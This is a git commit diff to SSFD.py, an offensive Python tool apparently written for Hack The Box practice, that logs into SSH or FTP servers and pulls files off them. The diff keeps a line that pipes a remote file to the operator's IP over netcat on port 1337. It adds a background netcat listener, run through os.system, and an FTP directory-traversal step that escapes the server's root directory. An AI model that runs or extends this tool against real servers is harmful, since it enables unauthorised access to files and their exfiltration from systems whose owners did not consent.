c0e5678252dae33363f17dd1ef94276344066c0b
lucky <luckythandel28@gmail.com>
2020-05-30 10:31:53 +0530

    Update SSFD.py

--- SSFD.py
+++ SSFD.py
@@ -6,7 +6,7 @@ import pexpect
 import argparse
 import re
 import ntpath
-
+import os
 parser = argparse.ArgumentParser(description="only for educational purpose!\n Our program use 1337 port. so, please make sure that you must not have any other service running on this port.")
 parser.add_argument("-P","--protocol",help="choose SSH or FTP", type=str, required=True)
 parser.add_argument("-u", "--username", help="username on the choosen port", required=True)
@@ -21,7 +21,7 @@ username = args.username
 Pass = args.password
 server_ip = args.serverip
 wants_to_download_file = args.filename
-
+d_file = ntpath.basename(wants_to_download_file)
 
 
 
@@ -39,7 +39,7 @@ def ssh_connector():
             child.sendline(f"netcat {args.myip} 1337 < {wants_to_download_file}")  
         else:
             print("trying the last option!\n")
-            exec(f"scp {username}@{server_ip}:{wants_to_download_file} /root/Desktop/")
+            os.system(f"scp {username}@{server_ip}:{wants_to_download_file} /root/Desktop/")
             print("You should have the file on your desktop")
     elif i == 1:
         print("Given info. was not correct!")
@@ -50,38 +50,37 @@ def ftp_connector():
     child = pexpect.spawn("ftp")
     child.expect("ftp>")
     child.sendline(f"open {server_ip}") # for testing HTB fatty FTP: 10.10.10.174
-    i = child.expect(["Name", "refused"])
+    i = child.expect(["220", "refused"])
     if i == 0:
-        print("Trying to connet...\n")
+        print("[+] server is ONLINE")
         child.sendline(username)
-        try:  
-            child.expect("password")
-            child.sendline(Pass)
-        except:
-            pass
+        child.expect("Password")
+        child.sendline(Pass)
         j = child.expect(["230","530"])
-        if j == 0:
-            print("Connected!\n")            
-            print("Trying to fetch files...")
-            child.sendline(f"get {wants_to_download_file}")
-            print(f"File {wants_to_download_file} has been downloaded!")
-        
+        if j == 0:    
+            print("You have logged in successfully")
+            child.sendline(f"cd ../../../../../../../../../../../../..{os.path.dirname(wants_to_download_file)}")
+            child.expect("250")
+            child.sendline(f"get {d_file}")
+            child.expect("ftp>")
+            child.sendline("bye")
         elif j == 1:
-            print("given info. was incorrect!")
+            print("creds are incorrect!")
             exit(0)
-        else:
-            print("Something went wrong!\n")
+    elif i == 1:
+        print("You are doing something wrong!\n")
+        exit(0)
 
 
-    
+
 if args.protocol == "ssh":
     print("Ok, we will try to download file with different options!")
-    d_file = ntpath.basename(wants_to_download_file)
-    exec(f"nc -lvp 1337 >{d_file} ")
+    os.system(f"nc -lvp 1337 >{d_file} &")
     ssh_connector()
 
 elif args.protocol == "ftp":
     print(f"You want to grab {d_file} file with FTP!")
     ftp_connector()
-
+else:
+    print("Wrong protocol\n Choose from [ftp/ssh]")
 
